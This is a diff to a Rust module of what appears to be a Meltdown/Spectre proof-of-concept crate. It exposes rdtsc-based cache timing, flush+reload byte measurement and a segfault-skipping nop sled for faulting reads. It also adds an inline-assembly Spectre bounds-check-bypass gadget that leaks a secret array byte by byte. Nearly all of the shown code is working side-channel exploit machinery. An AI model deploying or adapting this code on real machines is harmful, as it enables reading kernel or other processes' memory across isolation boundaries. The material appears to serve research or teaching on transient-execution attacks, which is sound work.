@@ -3,6 +3,9 @@ use crate::*;
 #[cfg(feature = "handle-sigsegv")]
 use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};
 
+#[cfg(feature = "std")]
+extern crate std;
+
 #[cfg(feature = "handle-sigsegv")]
 pub(crate) extern "C" fn handle_sigsegv(
     _signal: libc::c_int,
@@ -29,6 +32,7 @@ pub(crate) extern "C" fn handle_sigsegv(
 }
 
 #[inline(always)]
+#[cfg(feature = "tester")]
 pub(crate) fn flush_measurement_area() {
     unsafe {
         for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
@@ -40,7 +44,7 @@ pub(crate) fn flush_measurement_area() {
 }
 
 #[inline(always)]
-pub(crate) fn measure_time_to_read(address: usize) -> u64 {
+pub fn measure_time_to_read(address: usize) -> u64 {
     let delta_tsc;
     unsafe {
         asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
@@ -54,7 +58,8 @@ pub(crate) fn measure_time_to_read(address: usize) -> u64 {
 }
 
 #[inline(always)]
-pub(crate) fn measure_byte<M: Method>() -> Option<u8> {
+#[cfg(feature = "tester")]
+pub fn measure_byte<M: Method>() -> Option<u8> {
     unsafe {
         let nb_cycles_threshold = MIN_NB_CYCLES + M::NB_CYCLES_OFFSET;
         for i in 0..256 {
@@ -73,15 +78,36 @@ pub(crate) fn measure_byte<M: Method>() -> Option<u8> {
 }
 
 #[inline(always)]
-pub(crate) unsafe fn access_memory(target_adress: usize) {
+pub unsafe fn access_memory(base_addr: usize, target_adress: usize) {
     asm!(
         "mov rax, {0}", "movzx rax, byte ptr [rax]", "imul rax, {2}", "add rax, {1}", "movzx rax, byte ptr [rax]",
          // nop sled for the signal handler to skip the access upon segfault
          "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
-         in(reg) target_adress, in(reg) BASE_ADDR, in(reg) MULTIPLE_OFFSET, out("rbx") _, out("rax") _);
+         in(reg) target_adress, in(reg) base_addr, in(reg) MULTIPLE_OFFSET, out("rbx") _, out("rax") _);
 }
 
 #[inline(always)]
+pub unsafe fn access_memory_spectre(base_addr: usize, off: usize) {
+    let secret_base = MINIDOW_SECRET as *const _ as usize;
+    // we can only read the first SPECTRE_LIMIT bytes, so we're safe, right?
+    // Right!?
+    asm!(
+        // if off <= SPECTRE_LIMIT {
+        "mov rcx, [rcx]", "cmp rcx, {2}", "jb 2f",
+        // read_volatile(BASE_ADDR[MINIDOW_SECRET[off]*MULTIPLE_OFFSET])
+            // rbx = MINIDOW_SECRET[off]
+            "movzx rbx, byte ptr [rax+{0}]",
+            // rbx = MINIDOW_SECRET[off]*MULTIPLE_OFFSET
+            "imul rbx, {multiple_offset}",
+            // rax = *(BASE_ADDR+MINIDOW_SECRET[off]*MULTIPLE_OFFSET)
+            "movzx rax, byte ptr [{1}+rbx]",
+        // end of loop
+        "2:",
+        in(reg) secret_base, in(reg) base_addr, in(reg) off, multiple_offset = const MULTIPLE_OFFSET, inout("rax") off => _, inout("rcx") &SPECTRE_LIMIT => _, out("rbx") _);
+}
+
+#[inline(always)]
+#[cfg(feature = "tester")]
 pub(crate) fn repeat_move_for_training_meltdown() {
     unsafe {
         let train_addr = &TEST_ARR[0] as *const u8 as usize;
@@ -94,6 +120,7 @@ pub(crate) fn repeat_move_for_training_meltdown() {
     }
 }
 
+#[cfg(feature = "tester")]
 pub fn setup_measurements() {
     unsafe {
         let base_addr = TEST_ARR.as_ptr() as usize;
@@ -120,15 +147,10 @@ pub fn setup_measurements() {
         }
         read_flushed_time /= NB_CYCLES_TRAIN;
 
-        MIN_NB_CYCLES = core::cmp::min(
-            200,
-            core::cmp::max(
-                140,
-                read_cached_time + (read_flushed_time - read_cached_time) / 2,
-            ),
-        );
+        MIN_NB_CYCLES = read_cached_time + (read_flushed_time - read_cached_time) / 2;
 
-        println!(
+        #[cfg(feature = "std")]
+        std::println!(
             "time to read a:\n- cached entry: {}\n- cold entry: {}\nFixing the treshold at {} cycles",
             read_cached_time, read_flushed_time, MIN_NB_CYCLES
         );
